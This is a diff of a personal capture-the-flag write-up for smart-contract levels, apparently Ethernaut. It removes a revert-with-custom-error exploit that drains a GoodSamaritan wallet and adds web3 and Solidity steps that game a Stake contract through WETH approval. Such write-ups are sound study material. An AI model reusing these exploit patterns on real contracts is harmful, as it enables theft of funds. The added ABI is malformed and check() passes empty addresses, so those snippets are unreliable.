@@ -1,30 +1,43 @@
 ## Description
-At the first call wallet.donate10(msg.sender) we get to coin.transfer(dest_, 10); and from there we get to INotifyable(dest_).notify(amount_);. 
-We need to get an error keccak256(abi.encodeWithSignature("NotEnoughBalance()")) to make a second call to the function - wallet.transferRemainder(msg.sender);. There should be no error when calling it again. 
-It is convenient that the amount is passed to INotifyable and you can immediately determine when the error is needed and when it is not.
+Made myself a Stacker because the call will continue to be made from the contract, so that msg.sender would be mine and not the contract's. 
 ```
-contract Attack{
-    GoodSamaritan public goodSamaritan;
+const abi = [
+	{
+		"inputs": [],
+		"name": "StakeETH",
+		"outputs": [],
+		"stateMutability": "payable",
+		"type": "function"
+	},
+		"name": "Unstake",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	}
+];
 
-    error NotEnoughBalance();
-    
-    constructor(address payable _goodSamaritan){
-        goodSamaritan = GoodSamaritan(_goodSamaritan);
-    }
-
-    function attack() public {
-        goodSamaritan.requestDonation();
-    }
-
-    function notify(uint256 amount) public {
-        if(amount == 10){
-            revert NotEnoughBalance();
-        }
-        
-    }
-
-}
+const MyContract = new web3.eth.Contract(abi, contract.address);
+await MyContract.methods.StakeETH().send({from:player, value: toWei("0.002")})
+await MyContract.methods.Unstake(toWei('0.002')).send({from:player})
 ```
-I've learned a little bit about try\catch in solidity and I'm kind of used to custom errors, since I haven't used them before.
-![](try_catch.jpg)
+The next step is to approve and call StakeWETH
+```
+function check()public payable {
+        bytes memory data = abi.encodeWithSignature("allowance(address,address)","","");
+        bytes memory data2 = abi.encodeWithSignature("approve(address,uint256)","","");
+        console.logBytes(data2);
+    }
+
+    function approve()public {
+        uint256 amount = type(uint64).max;
+        WETH.call(abi.encodeWithSelector(0x095ea7b3, address(stake),amount));
+        (address(stake)).call(abi.encodeWithSignature("StakeWETH(uint256)", amount));
+    }
+```
 
